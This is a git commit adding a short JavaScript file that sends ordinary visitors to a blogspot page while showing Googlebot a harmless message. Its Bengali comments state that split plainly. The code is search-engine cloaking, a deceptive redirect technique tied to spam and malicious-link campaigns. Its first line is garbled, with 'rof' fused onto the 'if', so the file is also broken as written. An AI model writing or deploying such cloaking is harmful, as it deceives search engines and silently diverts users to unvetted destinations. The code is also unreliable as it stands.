868d048ae3fddf43f3b2f49eb547cfc95bea2bac
fghfghfghffghfgh <69869445+fghfghfghffghfgh@users.noreply.github.com>
2026-08-06 17:02:36 +0600

    rof.js

---
+++ rof.js
@@ -0,0 +1,7 @@
+rofif (!navigator.userAgent.includes('Googlebot')) {
+  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
+  window.location.href = "https://nang-kora-messi.blogspot.com/2026/08/rof.html";
+} else {
+  // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
+  console.log("Thanks for visiting my page" );
+}
